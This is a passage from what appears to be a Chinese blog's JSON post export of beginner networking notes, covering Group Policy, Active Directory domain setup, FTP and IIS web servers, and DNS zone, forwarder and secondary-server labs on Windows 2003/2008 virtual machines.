Uint）。首先是本地（Local）设置的组策略最先生效；Site为站点，可以理解为林的组策略，这个基本上用不到；接下来是域（Domain）的组策略生效，若此时，域的组策略与本地的组策略针对同一个策略进行了不同的设置，那么只有域的会生效。最后是OU，同理，OU的组策略也会替代域或本地的组策略而生效（相同策略情况下）。也因此，在组策略不重复的情况下，一台主机可能会应用多个组策略（本地，域以及OU）。 强制与阻止继承阻止继承：通过对OU进行设置，控制组策略生效范围，当对上级OU（例如公司）设置组策略时，下层OU（例如西北区）也会生效。阻止继承，可以指定该下级OU不生效上层OU的组策略。 强制：通过对上级OU的组策略进行设置，强制相对于该上级OU（例如公司）的所有下级OU（董事会，市场部及其子OU等）采用它的组策略。 当上级强制和下级阻止继承同时设置，强制生效！ 参考资料 千峰网络安全开源课程p39~p40","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础07(上)：域","slug":"网络安全基础07-上-域","date":"2020-10-02T12:34:54.000Z","updated":"2022-05-17T15:44:44.413Z","comments":true,"path":"2020/10/02/网络安全基础07-上-域/","link":"","permalink":"http://cata1oc.github.io/2020/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8007-%E4%B8%8A-%E5%9F%9F/","excerpt":"","text":"什么是域域（Domain），是Windows系统下提供的一种内网环境，在之前我们已经介绍过了一个概念，工作组，具体可以参考此篇，默认情况下，Windows会处于工作组模式（如下图所示），这是一种人人平等、但不方便管理的模式。工作组的诞生，主要是为了方便权限的赋予；本篇要介绍的域，它并不是一个人人平等的模式，但优点在于能够对用户进行集中、统一的管理。 域的特点集中/统一管理。 域的组成域控制器域的组成包括成员机和域控制器（Domain Controller，下文简称DC），这个DC的地位极高，可以控制所有域中的成员机，系统部署等行为，若DC宕机可导致公司全网瘫痪。 DC也是域的核心，当服务器系统（例如Windows 2008）安装了DC后，就生成了域环境，此时，该系统就会从工作组环境切换到域环境中，主机名也会发生改变，假设域名为loc.com，工作组环境下的主机名为dc。则域环境下的主机名会变为dc.loc.com。看到域名，自然会想到DNS，通常而言，域服务器与DNS服务器是绑定在一起的，否则还需要设置转发器指向别的DNS服务器。 在域环境下，除了有DC，还得有域成员，原先学习的net user命令是用来创建本地账号的，在别人电脑无法直接使用，只是能让同一网段别的电脑通过RDP远程登录来使用该账号访问服务器；而域账号却可以在别人的电脑上登录，这个是如何实现的呢？这里就要引出另一个概念，活动目录。 活动目录在安装DC时，会安装若干个软件，其中最重要的一个软件就是活动目录（Active Directory，下文简称AD）。可以把AD想象成一个数据库，它会存放公司中所有公共资源。例如新建一个域用户，用户名为a，密码为1。这样就会生成一条数据存放到AD中。然后域管理员就可以利用这个域用户的账号登录域环境中的任意一台主机。 具体过程如下，在域账号第一次登录前，该主机只有本地账号与本地管理员账号，通过域账号登录时，主机会发现自己的本地并没有存储这个账号的信息，因此它会向域中的老大咨询，也就是DC。DC会去AD中查询，发现有该账号的信息。遂允许该主机登录此域账号。这样就实现了通过域账号登录别人的主机。 组策略在介绍完AD后，就来介绍另一个与AD关系密切的配置，组策略（Group Policy）。组策略就是一条一条的规定，DC可以根据利用组策略来对域成员机进行管控。在很多公司中，每台主机仅允许登录域账号，这样，每次域账号登录时，除了根据AD验证自己账号的合法性，AD还会根据该主机所在表中的组策略对其进一步管控。 实验实验环境域服务器：Windows 2008 域成员：Windows XP，Windows 7 域的部署 关闭Windows 2008防火墙 将虚拟机桥接到同一个网段上（本实验选择VMnet1） 配置Windows 2008静态IP地址10.1.1.1/24，完了得把2008上面的IPv6的勾给去掉，防止影响实验。 开始->运行->输入dcpromo（既是安装指令，又是卸载指令），回车，屏幕上出现如下所示，对安装环境进行检测 若检测成功，则进入安装向导。不需要点使用高级模式，直接下一步。 进入兼容性声明，直接下一步。 进入配置域名系统设置，这里勾选上（域环境下，域服务器与DNS服务器通常都是绑定的），然后下一步 这里关于林的概念，简单介绍一下，假设一家公司总部在上海，分部在杭州，总部上海有一个域，杭州也有一个域，这时杭州这个域的DC作为域成员加入上海这个域中，这样两个域就构成了一个树。假设刚刚这个树研究的业务是网络安全，该公司还有另一个业务研究二进制安全，同样也构成一个树，该公司这两个树就构成了一个林。不过林太过庞大，国内几乎没有。这里选择在新林中新建域，然后下一步。 这里填域的FQDN，就是第一个域的名称，这里设置为loc.com 林功能级别，这里指接下来在林中新建域时，最低操作系统要求，若选择Windows 2008，之后创建域时，就只能使用Windows 2008或更高级的服务器系统来创建域。这里一般选择Windows 2003。 接下来是域功能级别，这个是对域中未来新加的DC进行限制（一般来说域不会只有1个）。域功能级别只对当前域有效，子域则受林功能级别限制，这里依旧选择Windows 2003。 接下来会遇到如下所示的报错，这是正常的，点击“是”就行。 然后会有一个路径设置，这里不需要改。简单说一下，NTDS就是AD存放的地方，SYSVOL则和组策略有关。 接下来需要设置一个密码，这个是AD的还原密码，通常情况下用不到。这里密码设置为666.com。 下一步，等待几分钟，完成域服务的安装，重启电脑应用设置。此时，登录窗口如下所示，在Administrator前多了一个LOC，这时原先的本地管理员已经升级成了域管理员。此时会要求我们设置新的密码，为了方便记住，这里也设置为666.com 再次打开系统查看，此时该计算机全名多了loc.com，工作组也变成了域loc.com 此时DNS服务已经被连带装好，进入后可以看到，在域loc.com中已经自动记录了当前主机的信息。 开始->管理工具->Active Directory 用户和计算机，在这个AD中可以查看很多信息，包括当前域成员（Computers），域中的DC（Domain Controllers），以及域中的组（由工作组升级而来） PC加入域 以XP为例，桥接VMnet1，配IP10.1.1.2/24，并指向DNS10.1.1.1。 我的电脑右键->属性->计算机名->更改->隶属于，选择域，输入loc.com 点击确定，会弹出对话框，以域管理员的身份登录，这里用户名填loc.com\\Administrator，密码则是刚刚修改的666.com。 稍等片刻，会弹出加入域成功的对话框，重启计算机后生效。 切换回Windows 2008，在AD上可以看到XP已经加入了域 然后新建一个用户验证一下，右键Users->新建->用户，格式如下，密码设置123.com 切回XP，已经加入域的XP，和服务器系统一样，需要按Ctrl-Alt-Delete来进入系统了。若要登录域成员，点击选项，将登录到切换为域名，这里为LOC，然后输入刚刚新建的域成员登录。 此时，右键我的电脑->属性->计算机名，可以看到该主机已加入域。这样就完成了一次PC加入域的操作，Win7加入域的方法类似。这里不再演示。 这里简要归纳几个常见问题 Code123456789101112131）加入域不成功 网络是不是不通！ 解析是否能成功解析！ 是否为DNS缓存问题 2）登入域不成功 如XP，已勾选登录域LOC，不用再写loc\\fall.cinder3）域用户的权限 建议将域用户加入到普通成员机的本地管理员组中(域管理员登上后修改) 本地管理员组：administrators 域管理员组：Domain Admins 扩展轻型目录访问协议（Lightweight Directory Access Protocol，缩写LDAP），可以扩展域功能，实现域对多个站点服务器的集中管理。 域综合实验 小结这里的小结，不是针对域这个知识点的总结，而是对于过去这半年的小结。实际上，现在已经是2021年2月23日晚上十点半了，我依然再写去年国庆节时期的博客。这也是因为，自8月份离职以来，直到10月22日我才开始恢复博客的更新，原本就已经差了接近70天了。但是进入12月后，我突然又变得像以前一样颓废，接近3个月的时间断断续续只更新了几篇博客，现在过完年复工快1周了。我依旧没有找到工作，现在算是付出代价了。从现在开始，计划也有所变化了，原先我更新博客过于细节了，导致在博客本身上花的时间过多了，现在向beglage学习，尽量精简，总结重要的知识点，只要自己能够看懂就足够了。因此，从下篇开始，博客会变得精简，贴图也会减少。现在只有尽可能的，在短时间内，完成对网络安全的学习和理解。 参考资料参考教程： 千峰网络安全开源课程p37~p38, p41, p43","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础06(下)：FTP服务器","slug":"网络安全基础06-下-Ftp服务器","date":"2020-10-01T06:47:37.000Z","updated":"2022-05-17T15:44:13.146Z","comments":true,"path":"2020/10/01/网络安全基础06-下-Ftp服务器/","link":"","permalink":"http://cata1oc.github.io/2020/10/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8006-%E4%B8%8B-Ftp%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"定义FTP（File Tranfer Protocol），文件传输协议。 端口TCP 20/21 FTP工作方式FTP的工作方式分为两种，主动模式与被动模式。其选择权在于客户机。下面根据温晓飞老师的图，来简单介绍这两种模式的工作方式。 主动模式先看左边的主动模式，客户机会随机选择一个端口，例如50001，向服务器发送FTP请求（此时已和服务器的21端口建立连接），服务器接收到请求后，会回复客户端要求验证客户机的用户名(User)和密码(Password)。接着客户机会发送相应的信息，完成验证后，可以进行数据传输。 此时，若客户发起请求，例如下载一个文件，在主动模式下，客户机会先通过方才建立连接的50001端口，向服务器的21端口发送一条消息，告诉服务器自己要用哪一个端口（随机选择的）接收文件数据，例如50002。然后，服务器会打开20端口，并通过该端口向客户机的50002端口发送数据。 被动模式被动模式与21端口的连接过程，与主动模式一样。 当客户机试图下载文件时，并不会事先告诉服务器自己要用哪一个端口接收，而且服务器会事先通过已经建立连接的21端口告诉客户机，自己要用哪一个端口（随机选择的，例如20001）给客户机传送数据。当客户机接收到服务器发来的数据时，会随机选择一个端口，例如50002，来接收数据。 关于防火墙防火墙会限制端口对数据的接收，若一个客户机开了防火墙，且没有开放某个端口，此时客户机将接收不到别人向此端口发送的数据，但是自己可以通过该端口向外发送数据（第一次主动向别人发送消息，可以建立连接，防火墙不再影响已经建立连接的通话，好比说打开防火墙，就是让一个人性格变的内向，任何人对他说话，他都不会理睬，但是有一天他看上了一个女生，然后主动向这个女生搭讪，这时，下次女生找她聊天时，他就会回复这个女生）。主动模式下，若客户机开了防火墙，则很大可能接收不到FTP服务器上的数据，原因是，用来接收数据的端口未被防火墙放行，此时服务器的20端口发送的数据被拒收了。被动模式下，则反过来，若服务器开了防火墙，那么用户就很难获取到数据了，在生产环境下，为了安全起见，服务器防火墙通常都是打开的，因此想要从服务器下载文件，一般选择主动模式，并关掉自己的防火墙。 FTP工具客户端：8UFtp 服务器端：IIS，FTPserver，Serv-U 这里简单介绍一下几个服务器端的FTP工具，IIS是微软自家的，操作较为繁琐，但是相对稳定，允许大量用户同时访问。适用于生产环境。不过IIS仅限于服务器版本的Windows系统，例如Win7/Win10，则可以考虑下述工具。 FTPserver属于迷你型FTP服务器，适用于少量用户间的FTP服务搭建，它的使用较为简单，可以创建与系统无关的FTP账号供用户登录，对于所选文件夹或文件，可自动获取最高权限，因此只需要在软件中设置用于对文件夹或文件的权限即可，不需要单独设置文件本身的NTFS权限。 Serv-U具备FTPserver已拥有的所有功能，并且与IIS同样稳定，可用于生产环境。Serv-U可以设置虚拟路径，用来实现不同用户对主文件夹外的文件进行访问。例如，A班和B班的教学进度不同，因此它们的教材不同，分别存于A文件夹与B文件夹。但此时有一份iso镜像文件，两个班的学生都需要使用，若将iso文件各拷贝一份放入两个文件夹，就比较浪费空间了。此时可以将iso镜像文件所在的文件夹设置成虚拟路径，并将该路径添加至两个班学生可以访问的路径中。就可以只保存一份实现双方访问同一份文件。此外，Serv-U可以通过设置磁盘配额，限制用户上传文件的总量大小。 实验实验环境客户机：Windows XP 服务器：Windows 2003 FTP软件：IIS 使用ftp服务 在前一篇学习Web服务器时，安装IIS实验，已经安装了ftp服务。21端口也已经打开。这里就接着上回的用。打开IIS，FTP站点->默认FTP站点->属性，可以看到一个本地路径，这个路径对应用户通过ftp访问时所进入的目录，紧接着下面是用户对访问时所设置的FTP权限。这里和文件共享很像，用户真正对该目录下文件的权限是FTP权限、NTFS权限经过与运算的结果。通常这样可以全部勾上，然后再单独为用户设置NTFS权限。 进入该目录，随意新建一个文件。 切换到客户机(Windows)，在地址栏输入ftp://10.1.1.1，访问Ftp服务器。将服务器上的文件下载下来，操作成功。这样简单的ftp服务使用就完成了。 部署ftp站点 将先前实验的默认FTP站点删除，这里重新部署一个。进入IIS，右键FTP站点->新建->FTP站点。描述就随便写，这里为FTPSite，IP地址与端口名使用默认即可（这里注意，一旦IIS使用了21端口，其它FTP软件例如Serv-U就无法使用该端口了，因此无法同时使用两款软件部署FTP服务器，使用一款时需要关掉另一款） 由于还没有学习到域，FTP用户隔离这里，使用默认即可 设置路径这里，可以专门新建一个目录供FTP服务的用户使用，我懒，这里使用之前默认FTP站点用的那个。 这里的权限指的是FTP权限，与共享权限类似，最终用户通过FTP服务访问的文件的权限，是经过FTP权限和NTFS权限进行与运算的结果，因此这里就都勾上就行了，然后再单独设置NTFS权限，NTFS权限可以参考此篇 接着就创建完成了，进入FTP站点属性->安全账户，将允许匿名连接的勾给去掉。这样，就只有服务器创建的用户可以访问FTP站点。并且可以通过设置文件的NTFS权限，对用户的操作进行限制。这部实验，就和之前介绍的共享文件服务器很像了，这里不再重复演示。 端口小结Code123456783389端口： 远程桌面23端口： telnet445端口: 共享服务UDP67, 68: DHCP 53端口: DNSTCP80: HTTPTCP443: HTTPSTCP20/21： FTP 参考资料参考课程： 千峰网络安全开源课程p35~36 参考链接： beglage笔记","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础06(上)：WEB服务器","slug":"网络安全基础06-上-Web服务器","date":"2020-09-30T05:29:41.000Z","updated":"2022-05-17T15:43:48.305Z","comments":true,"path":"2020/09/30/网络安全基础06-上-Web服务器/","link":"","permalink":"http://cata1oc.github.io/2020/09/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8006-%E4%B8%8A-Web%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"定义Web服务器又称网页服务器或HTTP服务器。 协议协议，是通话的前提；客户端想要与服务端进行通信，就需要满足规定的协议。拿前两天学习的DHCP与DNS协议来说，Win+R，输入services.msc，查看本地服务。 可以发现，当前主机作为DHCP和DNS的客户端，这两个服务都是打开的，若是将它们关闭，则当前主机无法再自动获取IP地址或是对域名进行解析了，而想要从服务端获取服务，就要遵循相应的协议，所有的通信都是建立在遵循同一套协议的基础上。Web服务器使用的是协议是HTTP或HTTPS。 端口HTTP协议端口号：TCP80 HTTPS协议端口号：TCP443 Web服务器发布软件 网站，需要包含多个网页，也需要具备IP地址，DNS以及端口相关信息。想要发布一个网站供人们访问，就需要通过web服务器发布软件，下面介绍几类： 微软：IIS（可发布Web网站和FTP站点） Linux：Apache/LAMP/Tomcat/Nginx .etc 第三方：phpStudy、XAMPP（均内嵌LAMP，主要用于学习和测试） 网站类型 静态网站：一般扩展名为.html或.htm，无后台数据库。 动态网站：这里需要稍作扩展的讲一下，在过去，没有前端这个概念，排版布局，页面渲染，数据库查询动态数据都会放在一起。能够实现这种功能的语言，例如PHP，就很受欢迎。那段时期，动态网站的扩展名通常为.asp或.php。现如今，前后端已经分离，并迈入了云端时代，网站界面通常用框架编写，会混入大量逻辑，文件可能是.tpl .vue .jsx这种框架独有格式的文件，但最后编译打包时，都会转为对应的html和js文件。前端和后台数据逻辑，已经分开了。 实验实验环境：客户机(Windows XP)、服务端(Windows 2003) Web服务器发布软件：IIS 安装IIS 进入Windows组件向导(参考DNS安装) -> 应用程序服务器 -> Internet信息服务(IIS) -> 勾上万维网服务(会自动勾上公用文件)，这里把下一篇要用到的文件传输协议(FTP)服务也给勾上。完成安装后，可以在管理工具中找到IIS。 安装之后，进入命令行输入netstat -an，可以发现，21端口(ftp)与80端口(http)已经打开。 发布网站 打开IIS管理器软件，在网站目录下，可以看到一个默认网站 我们试图去访问一下这个默认网站，切换到客户机(Windows XP)，打开任一游览器，访问10.1.1.1(服务器地址)。会看到如下所示情形。 这并不是访问出错了，切回服务器(Windows 2003)，在C盘下，可以看到一个叫做Inetpub目录，进入后会发现有多个目录，其中wwwroot这个目录就是存放网站信息的目录 进入后，会看到一个.htm文件，点开它，会发现它就是先前从客户机访问的网站。验证了刚刚实验的成功。 接下来，我们自己手动发布一个网站，网站是由网页和站点组成的，所以我们需要先编写一个网页，为了方便，这里只简单编写一个html文件，并将其存到指定目录下，名为index.html。 回到IIS管理器，选择网站，右键->新建->网站，关于网站描述，随便写就可以了，这里填的是Web0x1。 下一步，这里分别需要配置IP，端口以及主机头，这三个单位在部署多个站点时会有所用处。这里IP地址有两个选项，选择全部未分配时，会任意选择当前主机(服务器)下的IP地址作为网站的IP地址，由于当前只有一个IP地址，所以无论选择哪个都无所谓。端口这里默认填写80，主机头默认就不填了。后面会说到。 然后填写路径，这里选择刚刚编写的网页所在文件夹的路径。这里允许匿名访问网站一定要勾上！不然访问个网站还让你输用户名密码啥的 来到下一步，完成后情况如下。为了不影响实验，这里先把默认网站给它停止运行。右键Web0x1进入属性->文档。在右侧添加，将先前编写的index.html添加到默认内容文档，并移到最上方。保存设置。 这时，我们回到客户机(Windows XP)上来，再次试图访问10.1.1.1(服务器地址)，就可以看到先前编写的index.html作为网站页面出现。 这里作个小结，在使用IIS发布网站时需要指定网站的IP，端口，以及主机头值(域名)，在IP与端口确定的情况下，也可以不指定主机头值。此外需要设置网站属性，将要展示的页面，放到默认文档的最前面，这样访问时，就可以直接打开该网页。 部署多个站点前面学习了使用IIS发布网站，但是一个服务器只发布一个网站，那实在太浪费了，假设公司想弄一个业务系统出来，同样放在这个服务器上，该如何操作呢？接下来就介绍如何在一个Web服务器上部署多个站点： 首先，创建一个网页(为了方便，就不写一个业务系统了，随意写一个简单网页) 接着，新建一个网站，描述就写Web0x2，其它和手动发布网站一样，选择上一步创建的网页。创建完发现，该网站默认被停止运行了，当我们试图启动时，会出现如下弹窗。 它告诉我们，80端口已经被占用了，需要重新绑定端口号，进入Web0x2属性，在网站一栏，找到TCP端口，将其设置为任一1000以上的端口号即可。完了别忘记在文档一栏，将该站点对应的网页添加并移到默认内容文档的最上方。 设置完后，切回客户机，当访问10.1.1.1:8080时，就会进入Web0x2站点对应的网页，当访问10.1.1.1:80时就会进入Web0x1站点对应的网页（http协议默认是80端口因此会不显示）。这是通过控制端口完成对单服务器多网站的实现。 当然，除了控制端口，也可以通过控制IP地址来实现，首先进入服务器(Windows 2003)，给它增加一个地址。操作如下图所示 然后修改Web0x2，将其IP地址修改为10.1.1.3，端口则改回80。 也可以实现单服务器多网站 虽然控制IP或者端口都可以实现单服务器部署多个网站的操作，但这不是最优解。因为用户不会记住你的IP或者是端口，真实网站发布时也是如此，所以才有了第三种方法，通过设定网站主机头，也就是域名，来实现同样的操作。这里进行演示，例如进入Web0x2的属性后，选择网站->高级->编辑，设定主机值。然后对Web0x1使用类似的操作。 接下来就可以按照前一篇DNS正向解析的方式，给两个网站分别在正向查找区域中创建一个区域，并添加主机记录。 再回到客户机(Windows XP)，将DNS服务器指向我们的Windows 2003系统。此时便可通过域名访问同一台服务器上的不同站点了。在同IP地址，同端口的情况下。但是这样就不可以通过IP访问了。 动态网站部署(旧)这里就不进行完整的过程演示了，现如今，Asp项目在网上也已经很难找到了。不过对于sql注入等手法还是很有学习意义，这里只简单说明一下部署过程。 DNS服务中新增一条关于此网站域名的正向解析记录。 IIS中创建网站，勾上运行脚本（如ASP）和执行（如ISAPI应用程序或CGI）这两个选项。 网站属性中，找到对应的首页（如index.asp，default.asp），将其放到默认文档的最前面。 视频中介绍利用时有点翻车，进入网站属性->主目录->配置->选项->启用父路径。经此操作后，可以在前端页面通过首页访问首页所在目录的子目录下的网页。我对这里的疑问在于，既然可以设置服务器选项了，那么也没有必要去从前端进入控制台了。 端口小结Code12345673389端口： 远程桌面23端口： telnet445端口: 共享服务UDP67, 68: DHCP 53端口: DNSTCP80: HTTPTCP443: HTTPS 参考资料参考教程： 千峰开源课程p32~34 参考链接： beglage笔记","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础05(下)：DNS","slug":"网络安全基础05-下-DNS","date":"2020-09-26T09:15:56.000Z","updated":"2022-05-17T15:45:33.110Z","comments":true,"path":"2020/09/26/网络安全基础05-下-DNS/","link":"","permalink":"http://cata1oc.github.io/2020/09/26/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8005-%E4%B8%8B-DNS/","excerpt":"","text":"DNSDNS全称Domain Name Service，域名服务，作用是为客户机提供域名解析服务。 通常对于DNS的学习通常是从客户角度，学习DNS服务器提供域名解析服务的过程。本篇则从搭建的角度来学习DNS，由于大部分公司通常都有自己的DNS服务器，不直接使用运营商的，因此除了需要理解DNS的执行过程，也需要了解其搭建与维护的过程。 域名通常我们会认为www.sina.com.cn是一个域名，但从严格意义上来说sina.com.cn才被称为域名（全球唯一），而www是主机名，主机名.域名的格式称为完全限定域名（FQDN）。 一个域名下可以有多个主机，例如www.sina.com.cn可以进入新浪网的首页，mail.sina.com.cn则可以进入新浪邮箱的首页。 关于域名级的划分，简要概括如下，具体可以参考维基百科关于顶级域名与二级域名的介绍： Code12345www. zhihu. com .三级域 二级域 顶级域 根域www. zhihu. com. cn. .四级域 三级域 二级域 顶级域 根域 端口TCP53, UDP53 DNS解析DNS转发器通常，每个网段中都会有一个本地DNS服务器，大部分公司也会自己配置一个DNS服务器，它们通常会内置一个DNS转发器，在收到DNS解析请求后，它们会先查看自己能否处理，若不能处理，则通过转发器转发给运营商的DNS服务器去处理。在收到运营商DNS服务器解析的结果后，会返回给用户，并将该结果缓存在本地DNS服务器中。 正向/反向解析正向解析，是将域名解析成IP地址，进而访问对应网站。通常采用的是递归查询，图示如下： 例如，在命令行中可以通过指令nslookup 域名的形式，像DNS服务器发送请求解析域名，例如解析百度的域名： 反向解析，顾名思义，即通过IP去查询域名的过程。 DNS实验实验准备：2台Windows2003虚拟机（服务器），1台WindowsXP虚拟机（客户机）。 安装DNS服务 与安装DHCP服务相同，开始->控制面板->添加或删除程序，进入后选择添加/删除Windows组件，在网络服务中，找到域名系统（DNS），将其勾上并确定，即完成DNS服务的安装。 在安装服务之前，先做一个观察，进入命令行，查看当前已打开的端口： 安装的时候，会发现，这个DNS服务本地没有，需要从Service Pack 2 CD-ROM上面拷贝，那这个Service Pack 2 CD-ROM是什么呢？其实就是安装Windows2003系统时所用的镜像文件，只不过在安装时，一些必要的服务都没有安装上去，因此需要通过镜先文件重新安装，对于早年的操作系统，通常都是如此。具体操作为：右键当前虚拟机->设置->CD/DVD（IDE）->连接->使用ISO映像文件，并选择当前操作系统对应的镜像文件。 这里需要注意，一定要把设备状态里的选项给勾上，否则镜像将无法成功插入系统，并会出现 “在系统启动时至少有一个服务或驱动程序产生错误” 这样的错误提示。 若按照上述步骤，就可以看到可移动存储设备变成如下所示 点击它，选择安装可选的Windows组件，按照第一步，找到DNS并安装。安装后，再次查看已打开的端口。会发现53端口已经打开。即已开启DNS服务。 正向解析正向解析，也就是域名解析成IP。接下来，通过配置Windows 2003系统上的一台服务器，演示DNS服务器如何实现正向解析的功能： 打开DNS服务->主机->正向查找区域，右键新建区域，选择主要区域，主要区域相当于公司的主服务器，通常而言公司会有两台DNS服务器，另一个作为备份使用，创建时会选择辅助区域。 接下来填写区域名称，这里填的其实就是域名。这里选择填写baidu.com。 这么做的话，就相当于声明了该服务器就是baidu.com这个域名的权威DNS服务器。权威服务器意味着，解析出的结果一定真实可靠。例如先前真实机中试图解析域名时，访问的是非权威服务器。 下一步会创建一个新文件，名为baidu.com.dns，这里不作修改。再接下来选择不允许动态更新（其它选项在域时才会用到）。接着创建完成后，会生成两个文件： 第一个是SOA类型文件，它用来说明该域名（baidu.com）的权威服务器是谁，这里显示的是当前这台主机的主机名。 第二个是NS类型文件，用来记录所有可以解析这个域名（baidu.com）的服务器，目前只有当前主机。在之后有了备份服务器，则会增加创建辅助区域的主机名称。 用于正向解析时，这里选择右键新建主机记录，主机记录又称A记录。名称一栏填写主机名即可，此处填写www，FQDN一栏则会生成相应的完整域名。然后填写域名对应的IP地址，这里将域名的IP拟作4.4.4.4，然后选择添加主机。 经过上述操作后，（baidu.com）这个域名下多了一条记录。此时，www这个主机名所对应的当前域名的完全限定域名而言，已经可以通过当前DNS服务进行权威解析了。 下面进行验证，进入客户机Windows XP，将XP系统指向的DNS服务器设置为先前配置好的2003系统的IP地址。 此时在XP中进入命令行，通过nslookup指令解析www.baidu.com这个域名的地址。可以发现，我们指向的是IP地址为10.1.1.1DNS服务器，得到的结果也确实先前设置的4.4.4.4。这样，就完成了一个简单的正向解析实验。 最后在这里补充一些，如果我们想再增加一个完全限定域名的正向解析，只需按照上述过程再新建一条主机记录。这里要注意一点，我们知道在新增记录完成之前，试图解析该域名，是无法解析成功的；但是在新增记录完成后，仍可能解析失败。主要原因是XP系统存在DNS缓存机制，短时间内缓存记录的仍是上一次查询的结果。此时需要通过指令ipconfig /flushdns刷新缓存，再次解析，便能成功。通过指令ipconfig /displaydns可以显示当前的DNS缓存。 别名别名这个实验比较简单就不做了，简单说一下吧，在正向查找区域中新建一个别名(CNAME)，设置别名，并指定目标主机的FQDN（从现有的记录中选择）。这样通过别名或者原本的FQDN，访问的网址是相同的。 反向解析 反向解析，就是用IP地址去查询域名，观察先前的查询实验，会发现服务器名是UnKnown，出现这种情况的原因是像服务器寻求域名解析时会先问服务器域名是什么，但是服务器没有应答，因此被设置成了UnKnown。 为了解决上述情况，就要利用到反向解析。这里，和正向解析一样，先在正向查找区域新建一个主机记录，这里将主机名设置为dns1.baidu.com。与正向解析步骤不同的是，这里要将创建相关的指针(PTR)记录给勾上。 然后在反向查找区域中新建一个区域，这里的网络ID写的是网段，我们的主机IP地址为10.1.1.1，因此这里填写10.1.1 其它的默认下一步就行。创建完反向查找区域后，情况如下。 接着在反向查找区域中新建指针(PTR)，在主机IP号这里补充完整的IP地址。主机名，则游览文件，选择第二步中在正向查找区域中新建的主机记录。 确定后，反向查找区域中会增加一条记录。 接下来，回到客户机上，进行验证。可以看到通过nslookup指令解析域名时，可以看到服务器本身的域名了。不再是UnKnown。 转发器 转发器，简单来说，就是自己解析不了，转发给别的DNS服务器帮忙解析。我们需要配置另一台Windows 2003作为DNS服务器。首先，设置该服务器的IP地址为10.1.1.2，然后将其挂入与第一台Windows 2003系统（10.1.1.1）以及XP客户机同一个局域网中，本次实验为VMnet1上（在设置中将多台虚拟机配置为同一个网络适配器，即可实现虚拟机位于同一个局域网中）。并将用于安装DNS服务的Windows 2003 ISO镜像插入虚拟机。接着安装DNS服务，参考上文。 第二步，与正向解析相同，在新的DNS服务器创建一个正向查找区域，并新建一个主要区域，区域名称为qq.com，完成后在该区域中新建一条主机记录，设置主机名为www的完全限定域名的IP地址为6.7.8.9。完成后效果如下。 这个时候回到客户机XP上，试图解析刚刚设置的域名，发现不行，原因是我们设置的DNS服务器是10.1.1.1，而刚刚设置的域名记录在10.1.1.2这台DNS服务器。 这个时候就要利用转发器了，进入第一台DNS服务器，右键主机，进入属性。找到转发器，将第二台DNS服务器的IP地址添加进入转发器的IP地址列表。确定。 接下来，回到客户机XP上，再次试图解析域名时，便成功了。 辅助DNS服务器 在一开始，我们创建的区域都是主要区域，而辅助DNS服务器就要用到辅助区域，它的主要作用是备份，当一台服务器宕机后，可以有另一台服务器临时接管。例如，我们要备份主DNS服务器上baidu.com这个区域，操作如下：右键该区域名->属性->区域复制->勾上允许区域复制，这里有3个选项，通常选择只允许到下列服务器，这样最安全，并添加备用DNS服务器的IP地址。 接下来进入备份DNS服务器，在正向查找区域中，新建区域，这里选择辅助区域。 区域名称填写baidu.com，与主DNS服务器一样。然后将主DNS服务器的IP地址添加进入想要复制区域的DNS服务器地址列表。 点击确定后，此次实验就完成了对主DNS服务器正向查找区域内容的备份 虚拟机上真实网首先，简单说明一下原理。通常来说，一个局域网中的设备都是通过网线连在交换机或者路由器上，从而访问外网。在虚拟机中，是没法直接访问外网的，但是可以将虚拟机所在的VMnet设置为相同，使得不同虚拟机连上相同的虚拟交换机，从而将不同的虚拟机放入同一个局域网中，这样可以保证虚拟机之间可以互相ping通。其中VMnet0比较特殊，它可以看作是连入现实路由器的一款交换机，通过对VMnet0进行设置，就可以实现虚拟机上真实网。下面开始实验（本次实验以Windows XP作为实验环境）： 在操作之前，先确定一下网卡的型号。如下所示 在虚拟机左上角选择编辑，进入虚拟网络编辑器，选择更改设置 选择VMnet0，找到桥接模式，并将桥接对象设置为第一步中确定的网卡型号。 最后，将XP所在网络适配器设置为VMnet0 此时还没完，由于在前一篇DHCP的实验中，给XP客户机分配了特定的IP地址，此时需要重置一下IP。 可以看到，此时分配到的新IP所在网段与已经与真实机的相同。最后把DNS服务器再设置为自动获取。 综合实验综合实验这里就不展开了，实验建立在每台虚拟机能上真实网的情况下，假设将一台DNS服务器中的配置全部删除（清理缓存，删除记录，删除转发器等），此时将XP指向的DNS服务器设置为这台仅能上网，但是已经清空数据的DNS服务器。问，XP是否能够上网？ 答：能上。这个涉及到对DNS的原理的理解，尽管DNS服务器没有进行任何配置，但是它能够上网，因此会将请求转发给更上层的DNS服务器。最终还是可以得到域名解析的结果。因此，XP最终能够上网。 关于DNS攻击基于DNS的攻击方式，主要分为DNS劫持和DNS污染这两类： 先说DNS劫持，主要是通过攻击用户正在使用的DNS服务器或者伪造一个DNS服务器让用户使用，将域名解析为其它的IP地址，例如先前的实验中，将baidu.com的域名任意设定，用户就无法正常访问该域名对应的网站。 DNS污染的核心原理与DNS劫持是一样的，都是将域名解析为其它IP地址，造成用户无法正常访问。但是DNS污染，主要是针对DNS服务器的缓存进行投毒，先前的实验中，我们会通过ipconfig 